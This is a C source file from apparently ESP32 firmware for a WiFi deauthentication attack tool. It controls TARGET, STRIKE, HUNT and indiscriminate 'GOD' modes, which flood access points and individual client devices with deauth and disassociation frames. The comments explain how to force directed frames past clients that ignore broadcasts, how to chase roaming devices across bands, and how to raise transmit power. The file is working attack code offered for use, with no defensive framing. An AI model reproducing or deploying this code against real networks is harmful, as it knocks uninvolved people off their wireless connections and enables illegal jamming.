/*
 * Control surface — owns attack mode + selected targets + the attack task.
 * Both the web server and the serial CLI call into here.
 */
#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_heap_caps.h"
#include "esp_timer.h"
#include "esp_wifi.h"

#include "control.h"
#include "wifi_controller.h"
#include "deauth_engine.h"
#include "god_mode.h"

static const char *TAG = "CONTROL";

typedef enum { MODE_IDLE, MODE_TARGET, MODE_GOD, MODE_STRIKE, MODE_HUNT } attack_mode_t;
static volatile attack_mode_t s_mode = MODE_IDLE;

// Direct strike: a known client MAC on a known BSSID/channel. No discovery
// needed — we hammer directed (unicast) deauth straight at it. This is what
// actually drops an idle device that never shows up in passive sniffing.
static uint8_t s_strike_bssid[6], s_strike_mac[6];
static volatile uint8_t s_strike_ch = 0;
static volatile bool    s_strike_5  = false;

// Dual-band HUNT: one client MAC, both its band BSSIDs. We alternate parking on
// each band and hammering the client, fast enough that a roaming device can't
// finish reassociating on either band before we come back — nowhere to flee.
static uint8_t s_hunt_mac[6];
static struct { uint8_t bssid[6]; uint8_t ch; bool is5; } s_hunt[4];
static volatile int s_hunt_n = 0;
#define HUNT_DWELL_US 300000ULL   // time hammered on each band before switching

// Selected targets (snapshots so a rescan can't shift them mid-attack).
static wifi_network_t s_sel[WIFI_MAX_NETWORKS];
static int s_sel_idx[WIFI_MAX_NETWORKS];   // original list indices (for tx tally)
static volatile int s_sel_count = 0;

// Transient activity for the LED: 0 none, 1 scanning, 2 counting devices.
static volatile int s_busy = 0;

// Live TX rate (frames/sec), updated once a second.
static volatile uint32_t s_rate = 0;

#define TARGET_BURST          64    // deauth + disassoc frames per AP per cycle

#define GOD_REFRESH_US 45000000ULL   // re-scan targets every 45s in God Mode

// Halt gate: set when any control path needs to rewrite attack state. blast()
// checks it between frames, so a running burst stops within one frame instead
// of running on for tens of ms past s_mode = MODE_IDLE.
static volatile bool s_halt_req = false;

static void attack_task(void *arg)
{
    (void)arg;
    int64_t last_refresh = 0;
    int target_tick = 0;
    for (;;) {
        switch (s_mode) {
            case MODE_TARGET: {
                // Gapless: hammer the selected AP(s) continuously (broadcast +
                // directed to their sniffed clients). Only `stop` ends it.
                int n = s_sel_count;
                for (int i = 0; i < n && s_mode == MODE_TARGET; i++) {
                    int idx  = s_sel_idx[i];
                    int sent = deauth_attack_network(&s_sel[i], TARGET_BURST);
                    wifi_client_t cl[WIFI_MAX_CLIENTS];
                    int nc = wifi_get_clients(idx, cl, WIFI_MAX_CLIENTS);
                    for (int c = 0; c < nc; c++)
                        sent += deauth_client(s_sel[i].bssid, cl[c].mac, 24);
                    wifi_add_tx(idx, sent);
                }
                // Every ~5s, re-sniff each target channel to pick up idle clients
                // that only became active (e.g. trying to reconnect). This closes
                // the loop: broadcast disturbs a client -> it transmits -> we see
                // its MAC -> directed deauth keeps it down.
                if (++target_tick >= 12) {
                    target_tick = 0;
                    for (int i = 0; i < s_sel_count && s_mode == MODE_TARGET; i++)
                        wifi_sniff_channel(s_sel[i].channel, s_sel[i].is_5ghz, 500);
                }
                vTaskDelay(1);
                break;
            }
            case MODE_STRIKE: {
                // Locked onto one known client MAC — pure directed deauth, no
                // discovery, no gaps. The radio is parked on the target channel
                // (control_strike re-hosts the AP there), so we just re-assert
                // occasionally and hammer via the AP interface.
                if (++target_tick >= 200) {
                    target_tick = 0;
                    wifi_park_channel(s_strike_ch, s_strike_5);
                    deauth_set_tx_if(WIFI_IF_AP);
                }
                static const uint8_t BCAST[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
                deauth_client(s_strike_bssid, s_strike_mac, 96);      // directed
                deauth_send(s_strike_bssid, BCAST, 7, 64);           // + fast broadcast fill
                vTaskDelay(1);
                break;
            }
            case MODE_HUNT: {
                // Rotate across the client's bands. Park each, hammer the client
                // directed + broadcast for HUNT_DWELL_US, then switch. A roamer
                // fleeing band A lands on B just as we arrive there.
                static const uint8_t BCAST[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
                for (int p = 0; p < s_hunt_n && s_mode == MODE_HUNT; p++) {
                    // Park each band (re-hosts the AP there) so 5 GHz frames truly
                    // radiate, then hammer the client directed + broadcast.
                    wifi_park_channel(s_hunt[p].ch, s_hunt[p].is5);
                    deauth_set_tx_if(WIFI_IF_AP);
                    esp_wifi_config_80211_tx_rate(WIFI_IF_AP, WIFI_PHY_RATE_6M);
                    int64_t t0 = esp_timer_get_time();
                    while ((uint64_t)(esp_timer_get_time() - t0) < HUNT_DWELL_US
                           && s_mode == MODE_HUNT) {
                        deauth_client(s_hunt[p].bssid, s_hunt_mac, 96);
                        deauth_send(s_hunt[p].bssid, BCAST, 7, 48);
                        vTaskDelay(1);
                    }
                }
                break;
            }
            case MODE_GOD: {
                // Periodically refresh the target list: a re-scan drops APs that
                // left/shut down (so we stop wasting frames on them) and adds new
                // ones, and re-sniffs clients for directed deauth.
                int64_t now = esp_timer_get_time();
                if (last_refresh == 0 || (uint64_t)(now - last_refresh) > GOD_REFRESH_US) {
                    last_refresh = now;
                    s_busy = 1; ESP_LOGW(TAG, "GOD refresh: re-scanning networks + clients...");
                    wifi_dual_band_scan();      // refresh AP list (add new, drop gone)
                    s_busy = 2; wifi_count_clients();   // refresh clients for directed deauth
                    s_busy = 0;
                    if (s_mode != MODE_GOD) break;      // stopped during refresh
                }
                god_mode_process();   // broadcast + directed to every non-SAFE AP
                vTaskDelay(1);
                break;
            }
            case MODE_IDLE:
            default:
                last_refresh = 0;
                vTaskDelay(pdMS_TO_TICKS(200));
                break;
        }
    }
}

// Once a second, compute frames/sec and log it (visible in the serial monitor).
static void stats_task(void *arg)
{
    (void)arg;
    uint32_t last = 0;
    int idle_tick = 0;
    for (;;) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        uint32_t ok = 0, fail = 0;
        deauth_get_stats(&ok, &fail);
        s_rate = ok - last;
        last = ok;
        uint32_t heap = esp_get_free_heap_size();
        uint32_t minheap = esp_get_minimum_free_heap_size();
        if (s_mode != MODE_IDLE || s_rate) {
            uint32_t total = ok + fail;
            int failpct = total ? (int)((uint64_t)fail * 100 / total) : 0;
            ESP_LOGI(TAG, "==== %lu frames/sec | sent=%lu fail=%lu (%d%% fail) | %s | heap %lu (min %lu) ====",
                     (unsigned long)s_rate, (unsigned long)ok, (unsigned long)fail, failpct,
                     control_mode_str(),
                     (unsigned long)heap, (unsigned long)minheap);
            const wifi_network_t *nets = NULL;
            int cnt = wifi_get_networks(&nets);
            if (s_mode == MODE_TARGET) {
                for (int i = 0; i < s_sel_count; i++) {
                    int idx = s_sel_idx[i];
                    wifi_client_t cl[WIFI_MAX_CLIENTS];
                    int nc = wifi_get_clients(idx, cl, WIFI_MAX_CLIENTS);
                    ESP_LOGI(TAG, "  TARGET %s | ch%u %s | %lu frames total | %d client(s):",
                             nets[idx].ssid[0] ? nets[idx].ssid : "(hidden)",
                             nets[idx].channel, nets[idx].is_5ghz ? "5G" : "2.4G",
                             (unsigned long)nets[idx].tx, nc);
                    for (int c = 0; c < nc; c++)
                        ESP_LOGI(TAG, "      deauth -> %02x:%02x:%02x:%02x:%02x:%02x  (rssi %d, %u frames seen)",
                                 cl[c].mac[0], cl[c].mac[1], cl[c].mac[2],
                                 cl[c].mac[3], cl[c].mac[4], cl[c].mac[5],
                                 cl[c].rssi, cl[c].pkts);
                    if (nc == 0)
                        ESP_LOGI(TAG, "      (no clients discovered yet - broadcast deauth only; rescan to sniff clients)");
                }
            } else if (s_mode == MODE_STRIKE) {
                uint8_t rc = 0; wifi_second_chan_t rsec;
                esp_wifi_get_channel(&rc, &rsec);
                ESP_LOGI(TAG, "  STRIKE -> %02x:%02x:%02x:%02x:%02x:%02x want ch%u %s | radio ON ch%u | %lu/s",
                         s_strike_mac[0], s_strike_mac[1], s_strike_mac[2],
                         s_strike_mac[3], s_strike_mac[4], s_strike_mac[5],
                         s_strike_ch, s_strike_5 ? "5G" : "2.4G", rc, (unsigned long)s_rate);
            } else if (s_mode == MODE_HUNT) {
                uint8_t rc = 0; wifi_second_chan_t rsec; esp_wifi_get_channel(&rc, &rsec);
                ESP_LOGI(TAG, "  HUNT -> %02x:%02x:%02x:%02x:%02x:%02x across %d bands | radio ch%u | %lu/s",
                         s_hunt_mac[0], s_hunt_mac[1], s_hunt_mac[2],
                         s_hunt_mac[3], s_hunt_mac[4], s_hunt_mac[5],
                         s_hunt_n, rc, (unsigned long)s_rate);
            } else if (s_mode == MODE_GOD) {
                int atk = 0; unsigned long tot = 0;
                for (int i = 0; i < cnt; i++) if (!nets[i].safe) { atk++; tot += nets[i].tx; }
                ESP_LOGI(TAG, "  GOD: hitting %d networks (skipping SAFE), %lu frames total across all", atk, tot);
            }
        } else if (++idle_tick >= 30) {           // idle heartbeat every 30s
            idle_tick = 0;
            ESP_LOGI(TAG, "idle | heap %lu (min %lu)",
                     (unsigned long)heap, (unsigned long)minheap);
        }
    }
}

uint32_t control_rate(void) { return s_rate; }

void control_init(void)
{
    deauth_set_gate(&s_halt_req);
    xTaskCreate(attack_task, "attack", 4096, NULL, 4, NULL);
    xTaskCreate(stats_task,  "stats",  3072, NULL, 3, NULL);
}

int control_scan(void)
{
    s_mode = MODE_IDLE;
    esp_wifi_set_mode(WIFI_MODE_APSTA);   // strike/hunt drop to AP-only; scan needs STA
    s_busy = 1;                     // LED: scanning (blue)
    int n = wifi_dual_band_scan();  // find APs
    s_busy = 2;                     // LED: counting devices (cyan)
    wifi_count_clients();           // sniff stations per AP, in the same pass
    wifi_restore_ap_channel();
    s_busy = 0;
    return n;
}

int control_count_clients(void)
{
    s_mode = MODE_IDLE;
    s_busy = 2;
    int n = wifi_count_clients();    // restores AP channel itself
    s_busy = 0;
    return n;
}

static const char *auth_str(uint8_t a)
{
    switch (a) {
        case WIFI_AUTH_OPEN:          return "Open";
        case WIFI_AUTH_WEP:           return "WEP";
        case WIFI_AUTH_WPA_PSK:       return "WPA";
        case WIFI_AUTH_WPA2_PSK:      return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:  return "WPA/2";
        case WIFI_AUTH_ENTERPRISE:    return "WPA2-E";
        case WIFI_AUTH_WPA3_PSK:      return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
        case WIFI_AUTH_WAPI_PSK:      return "WAPI";
        case WIFI_AUTH_OWE:           return "OWE";
        case WIFI_AUTH_WPA3_ENT_192:  return "WPA3-E";
        default:                      return "?";
    }
}

// Escape a string for use inside a JSON string literal (SSIDs are attacker-
// controlled in this environment: they may contain quotes, backslashes or
// control bytes that would otherwise break the JSON).
static int json_escape(const char *in, char *out, int cap)
{
    int o = 0;
    for (; *in && o < cap - 1; in++) {
        unsigned char ch = (unsigned char)*in;
        if (ch == '"' || ch == '\\') {
            if (o > cap - 3) break;
            out[o++] = '\\';
            out[o++] = (char)ch;
        } else if (ch < 0x20) {
            if (o > cap - 7) break;
            o += snprintf(out + o, cap - o, "\\u%04x", ch);
        } else {
            out[o++] = (char)ch;
        }
    }
    out[o] = '\0';
    return o;
}

// Serialize one entry into row[], then copy it into out ONLY if it fits whole.
// Guarantees the emitted array is always valid JSON: no half-written entries,
// and room is always reserved for the closing ']'.
#define JSON_EMIT(len, cap, rowbuf, ...) do { \
    int w_ = snprintf(rowbuf, sizeof(rowbuf), __VA_ARGS__); \
    if (w_ > 0 && (size_t)w_ >= sizeof(rowbuf)) { \
        w_ = sizeof(rowbuf) - 1; \
        rowbuf[w_] = '\0'; \
    } \
    if (w_ > 0 && (len) + w_ <= (cap) - 2) { \
        memcpy((out) + (len), rowbuf, w_); \
        (len) += w_; \
    } \
} while (0)

int control_list_json(char *out, int cap)
{
    const wifi_network_t *nets = NULL;
    int n = wifi_get_networks(&nets);
    char ssid_esc[2 * 32 + 1];
    char row[512];
    int len = snprintf(out, cap, "[");
    for (int i = 0; i < n; i++) {
        json_escape(nets[i].ssid[0] ? nets[i].ssid : "(hidden)",
                    ssid_esc, sizeof(ssid_esc));
        JSON_EMIT(len, cap, row,
            "%s{\"i\":%d,\"ssid\":\"%s\",\"band\":\"%s\",\"ch\":%u,\"rssi\":%d,"
            "\"prot\":%s,\"safe\":%s,\"sec\":\"%s\",\"clients\":%u,\"tx\":%lu,\"bssid\":\"%02x:%02x:%02x:%02x:%02x:%02x\"}",
            i ? "," : "", i,
            ssid_esc,
            nets[i].is_5ghz ? "5G" : "2.4G", nets[i].channel, nets[i].rssi,
            nets[i].prot ? "true" : "false",
            nets[i].safe ? "true" : "false",
            auth_str(nets[i].auth),
            nets[i].clients, (unsigned long)nets[i].tx,
            nets[i].bssid[0], nets[i].bssid[1], nets[i].bssid[2],
            nets[i].bssid[3], nets[i].bssid[4], nets[i].bssid[5]);
    }
    len += snprintf(out + len, cap - len, "]");
    return len;
}

int control_devices_json(int idx, char *out, int cap)
{
    wifi_client_t cl[WIFI_MAX_CLIENTS];
    int c = wifi_get_clients(idx, cl, WIFI_MAX_CLIENTS);
    char row[160];
    int len = snprintf(out, cap, "[");
    for (int i = 0; i < c; i++) {
        bool priv = cl[i].mac[0] & 0x02;   // locally-administered = randomized
        JSON_EMIT(len, cap, row,
            "%s{\"mac\":\"%02x:%02x:%02x:%02x:%02x:%02x\",\"rssi\":%d,\"pkts\":%u,\"priv\":%s}",
            i ? "," : "",
            cl[i].mac[0], cl[i].mac[1], cl[i].mac[2],
            cl[i].mac[3], cl[i].mac[4], cl[i].mac[5],
            cl[i].rssi, cl[i].pkts, priv ? "true" : "false");
    }
    len += snprintf(out + len, cap - len, "]");
    return len;
}

void control_protect(const int *idx, int n)
{
    const wifi_network_t *nets = NULL;
    int have = wifi_get_networks(&nets);
    for (int i = 0; i < n; i++)
        if (idx[i] >= 0 && idx[i] < have) wifi_toggle_protected(nets[idx[i]].bssid);
}

int control_attack_selection(const int *idx, int n)
{
    const wifi_network_t *nets = NULL;
    int have = wifi_get_networks(&nets);
    int k = 0;
    // Halt any running attack FIRST: the attack task reads s_sel[] every cycle,
    // and we're about to overwrite it. The halt gate makes any in-flight blast
    // stop within one frame.
    s_halt_req = true;
    s_mode = MODE_IDLE;
    vTaskDelay(pdMS_TO_TICKS(5));   // let the current iteration observe the stop
    for (int i = 0; i < n && k < WIFI_MAX_NETWORKS; i++) {
        if (idx[i] >= 0 && idx[i] < have) { s_sel[k] = nets[idx[i]]; s_sel_idx[k] = idx[i]; k++; }
    }
    if (k == 0) return -1;
    s_sel_count = k;

    // Discover each target's clients FIRST. Modern devices IGNORE broadcast
    // deauth and only honour unicast frames addressed to their MAC, so we camp
    // on each target's channel ~2.5s with promiscuous to capture active clients,
    // then hit them with directed deauth.
    ESP_LOGW(TAG, "discovering clients on %d target(s) before attack...", k);
    for (int i = 0; i < k; i++)
        wifi_sniff_channel(s_sel[i].channel, s_sel[i].is_5ghz, 2500);

    s_mode = MODE_TARGET;
    s_halt_req = false;
    ESP_LOGW(TAG, "TARGET deauth on %d AP(s) @ full rate (directed + broadcast)", k);
    return k;
}

int control_strike(uint8_t ch, int is5, const uint8_t bssid[6], const uint8_t mac[6])
{
    if (!bssid || !mac || ch == 0) return -1;
    s_halt_req = true;              // halt the loop before rewriting its targets
    s_mode = MODE_IDLE;
    vTaskDelay(pdMS_TO_TICKS(5));
    memcpy(s_strike_bssid, bssid, 6);
    memcpy(s_strike_mac,   mac,   6);
    s_strike_ch = ch;
    s_strike_5  = is5 ? true : false;
    // AP-only during a strike: in APSTA the idle STA still periodically pulls the
    // radio off-channel (kills the 5 GHz rate). We don't sniff during a strike,
    // so drop the STA and give the radio entirely to the parked AP.
    esp_wifi_set_mode(WIFI_MODE_AP);
    // Park the radio on the target channel (re-hosts the AP there) BEFORE the
    // attack loop runs, so 5 GHz frames actually radiate on this channel.
    wifi_park_channel(ch, s_strike_5);
    deauth_set_tx_if(WIFI_IF_AP);
    // Force deauth frames out at the most robust OFDM rate (6 Mbps) so the target
    // reliably decodes every one — high MCS frames can be missed and ignored.
    esp_wifi_config_80211_tx_rate(WIFI_IF_AP, WIFI_PHY_RATE_6M);
    esp_wifi_set_max_tx_power(84);
    ESP_LOGW(TAG, "STRIKE %02x:%02x:%02x:%02x:%02x:%02x on ch%u %s (directed, parked)",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], ch, is5 ? "5G" : "2.4G");
    s_halt_req = false;
    s_mode = MODE_STRIKE;
    return 0;
}

int control_hunt(const uint8_t mac[6], const uint8_t (*bssids)[6],
                 const uint8_t *chans, const int *is5, int n)
{
    if (!mac || n <= 0 || n > 4) return -1;
    s_halt_req = true;              // halt the loop before rewriting its targets
    s_mode = MODE_IDLE;
    vTaskDelay(pdMS_TO_TICKS(5));
    memcpy(s_hunt_mac, mac, 6);
    for (int i = 0; i < n; i++) {
        memcpy(s_hunt[i].bssid, bssids[i], 6);
        s_hunt[i].ch  = chans[i];
        s_hunt[i].is5 = is5[i] ? true : false;
    }
    s_hunt_n = n;
    esp_wifi_set_mode(WIFI_MODE_AP);   // AP-only: give the whole radio to injection
    ESP_LOGW(TAG, "HUNT %02x:%02x:%02x:%02x:%02x:%02x across %d band(s), %dms/band",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], n, (int)(HUNT_DWELL_US/1000));
    s_halt_req = false;
    s_mode = MODE_HUNT;
    return n;
}

void control_god(void)
{
    s_halt_req = true;
    s_mode = MODE_IDLE;
    vTaskDelay(pdMS_TO_TICKS(5));   // let any running attack observe the stop
    esp_wifi_set_mode(WIFI_MODE_APSTA);   // strike/hunt drop STA; God's refresh scan needs it
    god_mode_start();
    s_halt_req = false;
    s_mode = MODE_GOD;
}

void control_stop(void)
{
    s_halt_req = true;              // close the TX gate for good until rearmed
    s_mode = MODE_IDLE;
    god_mode_stop();
    wifi_promisc_discovery(false);
    esp_wifi_set_mode(WIFI_MODE_APSTA);     // restore STA (strike drops it) for scanning
    wifi_set_ap_channel(WIFI_AP_HOME_CH);   // AP back home so the phone reconnects
}

const char *control_mode_str(void)
{
    switch (s_mode) {
        case MODE_TARGET: return "attacking";
        case MODE_STRIKE: return "strike";
        case MODE_HUNT:   return "hunt";
        case MODE_GOD:    return "god";
        default:          return "idle";
    }
}

int control_led_code(void)
{
    if (s_busy == 1) return 1;   // scanning
    if (s_busy == 2) return 2;   // counting devices
    if (s_mode == MODE_TARGET || s_mode == MODE_STRIKE || s_mode == MODE_HUNT) return 3;
    if (s_mode == MODE_GOD)    return 4;
    return 0;                    // idle
}
